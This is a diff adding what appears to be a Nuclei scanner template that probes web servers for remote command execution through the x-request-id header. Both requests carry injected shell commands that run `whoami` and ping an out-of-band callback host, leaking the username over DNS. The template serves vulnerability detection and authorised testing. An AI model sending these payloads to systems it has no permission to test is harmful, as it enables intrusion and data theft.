@@ -1,0 +1,27 @@
+id: RCE-REQUEST-ID
+
+info:
+  name: RCE with x-request-id
+  author: omkar7505
+  severity: critical
+  description: RCE with `x-request-id`
+  tags: rce,oast
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        x-request-id: |ping `whoami`.{{interactsh-url}} &
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        x-request-id: $(ping `whoami`.{{interactsh-url}})
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
